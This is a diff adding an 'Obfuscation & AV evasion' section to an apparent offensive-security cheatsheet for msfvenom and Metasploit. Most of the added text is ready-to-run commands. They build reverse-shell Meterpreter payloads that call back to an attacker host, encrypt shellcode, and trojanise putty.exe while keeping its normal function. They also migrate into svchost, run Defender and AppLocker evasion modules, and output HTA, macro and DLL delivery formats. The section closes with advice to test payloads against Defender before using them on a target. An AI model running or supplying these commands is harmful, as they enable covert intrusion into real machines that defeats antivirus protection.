@@ -105,8 +105,63 @@ msfvenom -p php/meterpreter/reverse_tcp         LHOST=<IP> LPORT=4444 -f raw    
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw    -o sc.bin
 # list: msfvenom --list payloads | grep meterpreter ; formats: msfvenom --list formats
 ```
-> Encoders (`-e x86/shikata_ga_nai`) do NOT beat modern AV — for evasion cross-compile a custom
-> loader or use `/osai-bypass`; don't rely on `-e`.
+
+## Obfuscation & AV evasion (msfvenom + MSF)
+> Reality first: **default msfvenom output and encoders are heavily signatured** — they will trip
+> Defender/most AV. Encoders defeat *bad-char/IDS* problems, NOT modern AV. For real evasion, emit
+> **raw shellcode** and run it through a custom loader (`/osai-bypass` → Freeze/loader, AES/XOR wrap),
+> or use a stageless payload + a signed template. The options below are the in-framework toolkit.
+
+### Encoding (bad-chars / basic mangling — not AV bypass)
+```bash
+msfvenom -p <payload> LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o e.exe   # 10 iterations
+msfvenom -p <payload> ... -b '\x00\x0a\x0d\xff' -f exe -o e.exe                            # avoid bad chars
+msfvenom -p <payload> --arch x64 --platform windows -e x64/xor_dynamic -f exe -o e.exe
+msfvenom --list encoders | grep excellent
+```
+
+### Payload encryption (better than encoders — hides the shellcode body)
+```bash
+msfvenom -p <payload> LHOST=<IP> LPORT=4444 \
+  --encrypt aes256 --encrypt-key 0123456789abcdef0123456789abcdef --encrypt-iv 0123456789abcdef \
+  -f raw -o enc.bin
+# --encrypt also supports: rc4 | xor | base64   (see: msfvenom --list encrypt)
+```
+
+### Embed in a legit binary (template injection)
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 \
+  -x /path/putty.exe -k -f exe -o putty_evil.exe     # -x template, -k keep original functionality
+```
+
+### Payload options that help against AV / sandboxes (set on the handler or via msfvenom `OPTION=val`)
+```
+PrependMigrate=true PrependMigrateProc=svchost.exe   # migrate off the dropper immediately
+EXITFUNC=thread                                       # don't kill the host process on exit
+```
+Prefer **stageless** (`windows/x64/meterpreter_reverse_tcp`) — no second-stage fetch for AV to catch,
+and better through egress filtering.
+
+### MSF evasion modules (Defender-aware generators)
+```
+use evasion/windows/windows_defender_exe
+set PAYLOAD windows/x64/meterpreter/reverse_tcp ; set LHOST <IP> ; set LPORT 4444 ; run
+use evasion/windows/windows_defender_js_hta          # .hta delivery
+use evasion/windows/applocker_evasion_install_util   # AppLocker-constrained hosts
+search evasion
+```
+
+### Format tricks for delivery / LOLBin execution
+```bash
+msfvenom -p <payload> ... -f psh-cmd  -o run.txt      # one-line PowerShell
+msfvenom -p <payload> ... -f hta-psh  -o e.hta        # mshta delivery
+msfvenom -p <payload> ... -f vbapplication -o e.vba   # macro
+msfvenom -p <payload> ... -f dll      -o e.dll        # rundll32 / sideload (see /osai-bypass lolbin)
+```
+
+> Chain with `/osai-bypass` (AMSI/ETW/CLM/Defender/AV, custom loaders) and `/osai-upload`
+> (magic bytes, polyglots) — those cover the evasion msfvenom can't. Verify a payload with
+> DefenderCheck/ThreatCheck before you burn it on a target.
 
 ## Meterpreter command cheatsheet
 ```
